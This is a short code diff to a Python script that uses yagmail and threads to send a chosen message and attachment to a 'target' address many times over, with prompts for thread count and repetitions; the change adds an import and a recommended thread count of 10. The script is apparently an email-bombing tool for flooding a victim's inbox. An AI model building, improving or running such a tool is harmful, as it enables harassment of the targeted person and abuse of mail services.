@@ -1,6 +1,7 @@
 import threading 
 import yagmail
 import os
+import time 
 
 def mail(sm,pwd,rm,sub,mes):
     yag = yagmail.SMTP(user=sm,password=pwd)
@@ -12,7 +13,7 @@ password=user_file.readline()
 receivemail=input("Enter target: ")
 subject=input("Enter subject: ")
 message=input("Enter message: ")
-thread_count=int(input("Enter number of threads: "))
+thread_count=int(input("Enter number of threads (Recommended=10): "))
 times=int(input("Enter number of times the threads have to run: "))
 atat=input("Enter attachment file name with extention: ")
 direc=os.getcwd()
